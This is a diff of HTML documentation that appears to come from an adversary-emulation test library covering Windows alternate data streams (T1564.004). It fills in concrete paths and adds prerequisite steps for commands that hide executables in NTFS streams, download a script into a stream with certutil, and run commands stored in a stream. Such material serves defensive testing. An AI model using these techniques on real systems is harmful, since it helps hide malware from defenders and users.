@@ -965,6 +965,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-the-file-must-exist-on-disk-at-specified-location-file-name">
+         Description: The file must exist on disk at specified location (#{file_name})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id2">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -1012,19 +1040,20 @@
 <p>Execute from Alternate Streams</p>
 <p><a class="reference external" href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">Reference - 1</a></p>
 <p><a class="reference external" href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">Reference - 2</a></p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>type C:\temp\evil.exe &gt; &quot;C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe&quot;
-extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
-findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe &gt; #{path}\file.txt:procexp.exe
+extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe
+findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe
 certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
-makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
-print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
-reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
-regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
-expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
-esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o 
+makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab
+print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe
+reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg
+regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat
+esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o 
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1046,7 +1075,7 @@ Upon execution cmd will run and attempt to launch desktop.ini. No windows remain
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
     New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
     }
-Start-Process -FilePath &quot;$env:comspec&quot; -ArgumentList &quot;/c,type,#{payload_path},&gt;,`&quot;#{ads_file_path}:#{ads_name}`&quot;&quot;
+Start-Process -FilePath &quot;$env:comspec&quot; -ArgumentList &quot;/c,type,c:\windows\system32\cmd.exe,&gt;,`&quot;C:\Users\Public\Libraries\yanki\desktop.ini:desktop.ini`&quot;&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1065,8 +1094,8 @@ folder to view that the alternate data stream exists. To view the data in the al
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>echo cmd /c echo &quot;Shell code execution.&quot;&gt; #{file_name}:#{ads_filename}
-for /f &quot;usebackq delims=?&quot; %i in (#{file_name}:#{ads_filename}) do %i
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>echo cmd /c echo &quot;Shell code execution.&quot;&gt; %temp%\T1564.004_has_ads_cmd.txt:adstest.txt
+for /f &quot;usebackq delims=?&quot; %i in (%temp%\T1564.004_has_ads_cmd.txt:adstest.txt) do %i
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1083,11 +1112,36 @@ for /f &quot;usebackq delims=?&quot; %i in (#{file_name}:#{ads_filename}) do %i
 <p>Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command “ls -Recurse | %{ gi <span class="math notranslate nohighlight">\(_.Fullname -stream *} | where stream -ne ':\)</span>Data’ | Select-Object pschildname”
 in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run “notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt” in the %temp% folder.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-the-file-must-exist-on-disk-at-specified-location-file-name">
+<h5>Description: The file must exist on disk at specified location (#{file_name})<a class="headerlink" href="#description-the-file-must-exist-on-disk-at-specified-location-file-name" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">T1564</span><span class="p">.</span><span class="n">004_has_ads_powershell</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">0</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">1</span> <span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">T1564</span><span class="p">.</span><span class="n">004_has_ads_powershell</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1564</span><span class="o">.</span><span class="mi">004</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">echo </span><span class="s2">&quot;test&quot;</span> <span class="p">&gt;</span> <span class="c">#{file_name} | set-content -path test.txt -stream #{ads_filename} -value &quot;test&quot;</span>
-<span class="nb">set-content</span> <span class="n">-path</span> <span class="c">#{file_name} -stream #{ads_filename} -value &quot;test2&quot;</span>
-<span class="nb">set-content</span> <span class="n">-path</span> <span class="p">.</span> <span class="n">-stream</span> <span class="c">#{ads_filename} -value &quot;test3&quot;</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">echo </span><span class="s2">&quot;test&quot;</span> <span class="p">&gt;</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">T1564</span><span class="p">.</span><span class="n">004_has_ads_powershell</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">set-content</span> <span class="n">-path</span> <span class="n">test</span><span class="p">.</span><span class="n">txt</span> <span class="n">-stream</span> <span class="n">adstest</span><span class="p">.</span><span class="n">txt</span> <span class="n">-value</span> <span class="s2">&quot;test&quot;</span>
+<span class="nb">set-content</span> <span class="n">-path</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">T1564</span><span class="p">.</span><span class="n">004_has_ads_powershell</span><span class="p">.</span><span class="n">txt</span> <span class="n">-stream</span> <span class="n">adstest</span><span class="p">.</span><span class="n">txt</span> <span class="n">-value</span> <span class="s2">&quot;test2&quot;</span>
+<span class="nb">set-content</span> <span class="n">-path</span> <span class="p">.</span> <span class="n">-stream</span> <span class="n">adstest</span><span class="p">.</span><span class="n">txt</span> <span class="n">-value</span> <span class="s2">&quot;test3&quot;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
